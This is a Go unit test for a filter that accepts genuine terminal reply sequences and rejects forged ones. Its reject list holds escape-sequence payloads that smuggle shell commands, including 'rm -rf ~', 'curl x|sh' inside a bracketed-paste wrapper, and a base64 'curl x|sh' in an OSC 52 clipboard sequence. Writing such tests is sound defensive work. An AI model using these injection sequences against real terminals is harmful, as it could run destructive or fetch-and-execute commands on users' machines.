package main

import "testing"

func TestAllowReply(t *testing.T) {
	ok := []string{"\x1b[24;80R", "\x1b[?62;22c", "\x1b[?1;2c", "\x1b[>1;10;0c", "\x1b[0n"}
	bad := []string{
		"touch ~/pwned\n",                // plain keystrokes
		"\x1b[24;80R\n",                  // valid reply + newline
		"\x1b[24;80Rrm -rf ~\r",          // reply followed by a command
		"\x1b[200~curl x|sh\x1b[201~\r",  // bracketed paste wrapper
		"\x1b]52;c;Y3VybCB4fHNoCg==\x07", // OSC 52 (clipboard)
		"\x1b[?62;22c\x1b[?62;22c",       // two replies in one message
		"\x1bP$q\"p\x1b\\",               // DECRQSS-shaped
		"\x1b[24;80r",                    // wrong final byte (DECSTBM)
		"\x1b[" + "1;" + "12345678R",     // over-long number
		"",
	}
	for _, s := range ok {
		if !allowReply([]byte(s)) {
			t.Errorf("rejected valid reply %q", s)
		}
	}
	for _, s := range bad {
		if allowReply([]byte(s)) {
			t.Errorf("accepted forged reply %q", s)
		}
	}
}
